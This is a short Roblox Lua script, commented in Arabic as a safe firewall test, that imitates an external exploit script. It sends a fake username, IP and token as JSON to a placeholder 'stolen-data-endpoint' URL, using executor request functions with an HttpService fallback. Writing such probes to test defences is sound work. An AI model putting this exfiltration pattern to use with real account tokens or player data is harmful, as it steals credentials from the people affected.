-- [[ SAFE SECURITY TEST SCRIPT ]]
-- هذا الكود مخصص لاختبار جدار الحماية فقط (آمن تماماً ولا يحتوي على أي ضرر)

local HttpService = game:GetService("HttpService")

print("[TEST] تشغيل سكربت الاختبار... محاولة إرسال طلب إنترنت وهمي.")

-- محاكاة إرسال بيانات وهمية إلى رابط مجهول (بنفس الطريقة التي تستخدمها السكربتات الخارجية)
local testUrl = "https://api.test-webhook-check.com/v1/stolen-data-endpoint"
local testData = '{"Username": "Player123", "IP": "192.168.1.1", "Token": "Fake_Token_99283"}'

-- تشغيل دالة الطلب
task.spawn(function()
    local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request
    
    if requestFunc then
        -- محاولة الإرسال عبر الدالة المتقدمة
        requestFunc({
            Url = testUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = testData
        })
    else
        -- محاولة الإرسال عبر الدالة التقليدية
        pcall(function()
            HttpService:PostAsync(testUrl, testData)
        end)
    end
end)

